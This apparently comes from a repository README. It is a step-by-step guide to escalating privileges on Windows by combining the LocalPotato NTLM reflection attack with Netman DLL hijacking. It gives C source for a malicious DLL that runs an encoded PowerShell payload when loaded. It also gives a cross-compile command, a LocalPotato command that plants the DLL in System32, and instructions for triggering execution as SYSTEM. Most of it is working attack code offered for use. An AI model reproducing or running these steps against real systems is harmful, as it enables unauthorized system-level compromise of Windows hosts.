# LocaLPotato + DLL Hijacking Exploitation Paths

## Overview

LocaLPotato is an attack technique exploiting NTLM reflection vulnerabilities to facilitate local authentication attacks. This method enables attackers to read/write files arbitrarily and escalate privileges on a target system.

Significant vulnerabilities associated with LocaLPotato include:
- **SMB Scenario**: Addressed by Microsoft in the January 2023 Patch Tuesday (CVE-2023-21746).
- **HTTP/WebDAV Scenario**: Remains unpatched and exploitable on systems with the latest updates.

This repository provides a straightforward guide on leveraging LocaLPotato through various DLL hijacking vulnerabilities.

## Getting Started

### Prerequisites

- Download and compile the LocaLPotato tool from [decoder-it/LocalPotato](https://github.com/decoder-it/LocalPotato/tree/master).

### Exploitation Steps

#### 1. DLL Hijacking with Netman

Refer to the detailed guide on [Windows Server Netman DLL Hijacking](https://itm4n.github.io/windows-server-netman-dll-hijacking/) for initial setup.

**Creating a Reference File for the DLL**:
- **wlanapi.dll**: Required for Windows Server 2012.
- **wlanhlp.dll**: Required for other versions.

**Example of DLL Source Code (`wlanapi.c`)**:

```c
#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            system("powershell -enc JAB1A..."); // Insert your encoded PowerShell script here
            break;
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

**Compiling the DLL on Linux:**
```bash
x86_64-w64-mingw32-gcc -shared -o wlanapi.dll wlanapi.c wlanapi_orig.def -s
```

**Deploying with LocaLPotato:**
Place the compiled DLL in a directory within the system's %PATH%, for example:
```bash
LocalPotato.exe -i C:\Temp\Exp\wlanapi.dll -o Windows\System32\WindowsPowerShell\v1.0\wlanapi.dll
```

**Triggering the Exploit:**
Compile and execute the NetManTrigger. The malicious DLL will be loaded and executed in the system user context.
